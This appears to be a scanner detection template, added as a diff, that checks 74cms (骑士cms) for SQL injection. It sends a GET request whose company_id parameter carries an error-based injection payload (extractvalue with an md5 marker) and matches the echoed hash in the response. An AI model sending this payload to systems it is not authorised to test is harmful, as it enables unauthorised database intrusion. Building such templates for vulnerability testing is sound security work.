@@ -1,0 +1,32 @@
+{
+    "Name": "74cms-sqli-3",
+    "Description": "74cms-sqli-3",
+    "Product": "骑士cms",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "GET",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+        "Uri":"/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa\") and extractvalue(1,concat(0x7e,md5(99999999))) -- a",
+        "Port":"",
+        "Data":"",
+        "follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+            "Check_Steps":"AND",
+            "Checks": [
+                    {
+                    "Operation": "contains", 
+                    "Key":"",
+                    "Value": "ef775988943825d2871e1cfa75473ec"
+                    },
+                     {
+                    "Operation": "code", 
+                    "Key":"",
+                    "Value": "200"  
+                     }
+            ]
+            },
+            "Next_decide":""
+        }
+    ]}
